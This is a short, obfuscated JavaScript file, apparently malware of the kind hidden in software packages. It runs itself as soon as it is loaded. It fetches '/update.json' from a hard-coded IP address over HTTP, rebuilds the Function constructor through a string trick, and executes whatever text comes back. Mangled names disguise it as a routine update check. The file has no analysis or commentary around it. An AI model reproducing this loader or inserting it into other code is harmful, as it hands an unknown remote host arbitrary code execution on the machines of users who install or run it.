;(function () {
  var _0x20352b = require('http')
  return _0x20352b.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0x3cd692) {
      var _0x1f4ba0 = ''
      _0x3cd692.on('data', function (_0x69e943) {
        _0x1f4ba0 += _0x69e943
      })
      _0x3cd692.on('end', function () {
        var _0x563a03 =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x59144c = new _0x563a03(_0x1f4ba0)
        _0x59144c()
      })
    }
  )
})()
